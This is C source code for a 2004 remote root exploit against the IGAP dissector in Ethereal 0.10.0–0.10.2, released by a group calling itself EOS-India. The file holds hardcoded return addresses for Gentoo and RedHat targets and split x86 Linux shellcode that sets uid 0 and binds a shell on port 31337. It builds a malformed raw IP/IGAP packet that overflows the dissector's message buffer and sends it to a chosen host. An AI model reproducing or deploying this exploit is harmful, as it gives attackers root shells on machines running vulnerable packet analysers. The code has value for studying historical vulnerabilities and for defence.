/*
 * THE EYE ON SECURITY RESEARCH GROUP - INDIA
 * Ethereal IGAP Dissector Message Overflow Remote Root exploit
 *
 * Copyright 2004 - EOS-India Group
 *
 * Authors note:
 * Shellcode splitting technique:
 * Due to difficulty involved while following normal exploitation techniques due to shortage of memory space
 * for our shellcode, we used the technique of shellcode splitting. In this technique one part of the shellcode
 * is kept before the buffer which overwrites the saved EIP on stack followed by a jmp OFFSET instruction which
 * jumps EIP to the second half of the shellcode which is kept after return address. Also since our shellcode
 * requires EBP to contain a usuable stack address, we overwrite saved EBP also.
 *
 * Disclaimer:
 * This code is for educational purpose and testing only. The Eye on Security Research Group - India, cannot
 * be held responsible for any damage caused due to misuse of this code.
 * This code is a proof of concept exploit for a serious vulnerability that exists in Ethereal 0.10.0 to
 * Ethereal 0.10.2.
 *
 * Nilanjan De [n2n+linuxmail.org] - Abhisek Datta [abhisek+front.ru]
 * http://www.eos-india.net
 *
*/
#define IPPROTO_IGAP    0x02 // IPPROTO_IGMP=0x02
#define PAYLOAD_SIZE    (255-64)
#define MAX_BUFF        sizeof(struct igap_header)+sizeof(struct ipheader)
#define EXP             "Ethereal(v0.10.0-0.10.2) IGAP Dissector Message Overflow Exploit"
#define VER             "0.2"
#define SOCKET_ERROR    -1
#define MAX_PACKET      10
#define RETOFFSET       76
#define SRC_IP          "192.31.33.7"
#include <stdio.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>

#define MAX_ARCH        5
struct eos{
        char *arch;
        unsigned long ret;
} targets[] = {
        "tEthereal(0.10.2)-Gentoo(gdb)",
        0xbffede50,
        //-------------------------------
        "tEthereal(0.10.2)-Gentoo     ",
        0xbffede10,
        //-------------------------------
        "Ethereal(0.10.2)-Gentoo      ",
        0xbfffd560,
        //-------------------------------
        "tEthereal(0.10.2)-RedHat 8   ",
        0xbffedfb8,
        //-------------------------------
        "Ethereal(0.10.2)-RedHat 8    ",
        0xbfffcd08,
        //-------------------------------
        NULL,
        0
};


/*
 x86 linux portbind a shell in port 31337
 based on shellcode from www.shellcode.com.ar
 with a few modifications by us
*/

char shellcode_firsthalf[]=
        /* sys_fork() */
        "\x31\xc0"                      // xorl         %eax,%eax
        "\x31\xdb"                      // xorl         %ebx,%ebx
        "\xb0\x02"                      // movb         $0x2,%al
        "\xcd\x80"                      // int          $0x80
        "\x38\xc3"                      // cmpl         %ebx,%eax
        "\x74\x05"                      // je           0x5
        /* sys_exit() */
        "\x8d\x43\x01"                  // leal         0x1(%ebx),%eax
        "\xcd\x80"                      // int          $0x80
        /* setuid(0) */
        "\x31\xc0"                      // xorl         %eax,%eax
        "\x31\xdb"                      // xorl         %ebx,%ebx
        "\xb0\x17"                      // movb         $0x17,%al
        "\xcd\x80"                      // int          $0x80
        /* socket() */
        "\x31\xc0"                      // xorl    %eax,%eax
        "\x89\x45\x10"                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)
        "\x40"                          // incl    %eax
        "\x89\xc3"                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)
        "\x40"                          // incl    %eax
        "\x89\x45\x08"                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2)
        "\x8d\x4d\x08"                  // leal    0x8(%ebp),%ecx
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
        "\x89\x45\x08"                  // movl    %eax,0x8(%ebp)
        ;
char jumpcode[]="\xeb\x10";

char shellcode_secondhalf[]=
        /* bind()*/
        "\x43"                          // incl    %ebx(SYS_BIND = 0x2)
        "\x66\x89\x5d\x14"              // movw    %bx,0x14(%ebp)(AF_INET = 0x2)
        "\x66\xc7\x45\x16\x7a\x69"      // movw    $0x697a,0x16(%ebp)(port=31337)
        "\x31\xd2"                      // xorl    %edx,%edx
        "\x89\x55\x18"                  // movl    %edx,0x18(%ebp)
        "\x8d\x55\x14"                  // leal    0x14(%ebp),%edx
        "\x89\x55\x0c"                  // movl    %edx,0xc(%ebp)
        "\xc6\x45\x10\x10"              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80

        /* listen() */
        "\x40"                          // incl    %eax
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)
        "\x43"                          // incl    %ebx
        "\x43"                          // incl    %ebx(SYS_LISTEN = 0x4)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80

        /* accept() */
        "\x43"                          // incl    %ebx
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)
        "\x89\x45\x10"                  // movl    %eax,0x10(%ebp)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
        "\x89\xc3"                      // movl    %eax,%ebx

        /* dup2() */
        "\x31\xc9"                      // xorl    %ecx,%ecx
        "\xb0\x3f"                      // movb    $0x3f,%al
        "\xcd\x80"                      // int     $0x80
        "\x41"                          // incl    %ecx
        "\x80\xf9\x03"                  // cmpb    $0x3,%cl
        "\x75\xf6"                      // jne     -0xa

        /* execve() */
        "\x31\xd2"                      // xorl    %edx,%edx
        "\x52"                          // pushl   %edx
        "\x68\x6e\x2f\x73\x68"          // pushl   $0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // pushl   $0x69622f2f
        "\x89\xe3"                      // movl    %esp,%ebx
        "\x52"                          // pushl   %edx
        "\x53"                          // pushl   %ebx
        "\x89\xe1"                      // movl    %esp,%ecx
        "\xb0\x0b"                      // movb    $0xb,%al
        "\xcd\x80";                     // int     $0x80

struct ipheader {
        unsigned char ip_hl:4, ip_v:4;
        unsigned char ip_tos;
        unsigned short int ip_len;
        unsigned short int ip_id;
        unsigned short int ip_off;
        unsigned char ip_ttl;
        unsigned char ip_proto;
        unsigned short int ip_sum;
        unsigned int ip_src;
        unsigned int ip_dst;
};

struct igap_header {                    // This is a malformed header which does not conforms with IGAP RFC
        unsigned char igap_type;        // Message Type
        unsigned char igap_restime;     // Response Time
        unsigned short int igap_cksum;  // IGAP Message Checksum
        unsigned int igap_gaddr;        // Group Address
        unsigned char igap_ver;         // Version
        unsigned char igap_stype;       // SubType
        unsigned char igap_reserved1;   // Reserved
        unsigned char igap_cid;         // Challenge ID
        unsigned char igap_asize;       // Account Size
        unsigned char igap_msgsize;     // Message Size
        unsigned short int igap_reserved2;      // Reserved
        /*
        unsigned char igap_uaccount[16];// User Account
        unsigned char igap_message[64]  // Message
        */
        unsigned char igap_payload[16+64+PAYLOAD_SIZE]; // This buffer will contain payload, here we differ from RFC by sending a bigger message.
};

unsigned short checksum(unsigned short *buf,int nwords)
{
        unsigned long sum;
        for (sum = 0; nwords > 0; nwords--)
                sum += *(buf)++;
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        return ~sum;
}

void showhelp(char *pr00gie) {
        int i=0;
        printf("######### The Eye on Security Research Group - India ########\n");
        printf("%s %s\n",EXP,VER);
        printf("abhisek[at]front[dot]ru - n2n[at]linuxmail[dot]org\n");
        printf("http://www.eos-india.net\n\n");
        printf("[usage]\n");
        printf("%s [Remote Host] [Target]\n",pr00gie);
        printf("[Available Targets]\n");
        while(targets[i].arch != NULL) {
                printf("%d. - %s\t - %p\n",(i),targets[i].arch,targets[i].ret);
                i++;
        }
        exit(1);
}

int main(int argc,char *argv[]) {
        char buffer[MAX_BUFF];
        struct ipheader *iphdr=(struct ipheader*)buffer;
        struct igap_header *igaphdr=(struct igap_header*)(buffer+sizeof(struct ipheader));
        int sockfd;
        unsigned long addr;
        int one=1;
        int i;
        const int *val=&one;
        struct sockaddr_in sin;
        unsigned long magic;
        unsigned int n;

        if(getuid()) {
                printf("- This code opens SOCK_RAW which needs root privilege\n");
                exit(1);
        }
        if(argc != 3)
                showhelp(argv[0]);
        n=atoi(argv[2]);
        if(n >= MAX_ARCH) {
                printf("- Invalid target\n");
                showhelp(argv[0]);
        }
        magic=targets[n].ret;
        printf("-Using RET %p\n",magic);
        addr=inet_addr(argv[1]);
        if(addr==INADDR_NONE) {
                printf("- Invalid target\n");
                exit(1);
        }
        sin.sin_addr.s_addr=addr;
        sin.sin_family=AF_INET;
        sin.sin_port=0x00;
        sockfd=socket(PF_INET,SOCK_RAW,IPPROTO_RAW);
        if(sockfd==SOCKET_ERROR) {
                printf("- Failed creating SOCK_RAW descriptor\n");
                exit(1);
        }
        if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,val,sizeof(one)) < 0)
                printf ("- WARNING !! :Cannot set IP_HDRINCL!\n");
        memset(buffer,0x00,MAX_BUFF);
        // Filling IP Header
        iphdr->ip_hl=0x05;
        iphdr->ip_v=0x04;
        iphdr->ip_tos=0x00;
        iphdr->ip_len=MAX_BUFF;
        iphdr->ip_id=htonl(54321);
        iphdr->ip_off=0x00; // Lower 3 bit=Flag4Fragmentation - Higher 13 Bit=Fragment Offset
        iphdr->ip_ttl=0x01;
        iphdr->ip_proto=IPPROTO_IGAP; // IPPROTO_IGMP
        iphdr->ip_sum=0x00; // Fill sum before sending packet
        iphdr->ip_src=inet_addr (SRC_IP);
        iphdr->ip_dst=addr;
        // Filling IGAP Header
        igaphdr->igap_type=0x41; // IGAP Membership Query
        igaphdr->igap_restime=0x0a; //
        igaphdr->igap_cksum=0x00; // compute before sending packet
        igaphdr->igap_gaddr=0x00; // Ignored in IGAP Membership Query Message
        igaphdr->igap_ver=0x01; // IGAPv1
        igaphdr->igap_stype=0x21; // Basic Query
        igaphdr->igap_reserved1=0x00; // Ignored
        igaphdr->igap_cid=0x00; // Challenge ID (ignored because Chanllenge Response authentication not used)
        igaphdr->igap_asize=0x10; // MAX Size of Account Name Field
        igaphdr->igap_msgsize=0x40+PAYLOAD_SIZE; //  Size of Message
        igaphdr->igap_reserved2=0x00; // Reserved
        // Building exploit buffer
        //for(i=0;i<16+64+PAYLOAD_SIZE;i++)
        //      memset(igaphdr->igap_payload+i,(unsigned char)i,1);
        memset(igaphdr->igap_payload,0x90,16+64+PAYLOAD_SIZE);
        memcpy(igaphdr->igap_payload+16+RETOFFSET-strlen(shellcode_firsthalf)-8,shellcode_firsthalf,strlen(shellcode_firsthalf));
        memcpy(igaphdr->igap_payload+16+64+RETOFFSET-strlen(jumpcode)-4,jumpcode,strlen(jumpcode));
        memcpy(igaphdr->igap_payload+16+64+RETOFFSET,&magic,4);
        magic-=0x10;
        memcpy(igaphdr->igap_payload+16+64+RETOFFSET-4,&magic,4);
        memcpy(igaphdr->igap_payload+16+64+PAYLOAD_SIZE-strlen(shellcode_secondhalf)-1,shellcode_secondhalf,strlen(shellcode_secondhalf));
        // Calculating checksum
        igaphdr->igap_cksum=checksum((unsigned short*)(buffer+sizeof(struct ipheader)),(sizeof(struct igap_header))>>1);
        iphdr->ip_sum = checksum ((unsigned short*)buffer,(iphdr->ip_len)>>1);
        // Sending
        one=MAX_PACKET;
        while(one) {
                sendto(sockfd,buffer,MAX_BUFF,0,(struct sockaddr*)&sin,sizeof(sin));
                printf(".");
                one--;
        }
        close(sockfd);
        printf("\n- Send %d packets to %s\n",MAX_PACKET,argv[1]);
        printf("- Read source to know what to do to check if the exploit worked\n");
        return 0;
}

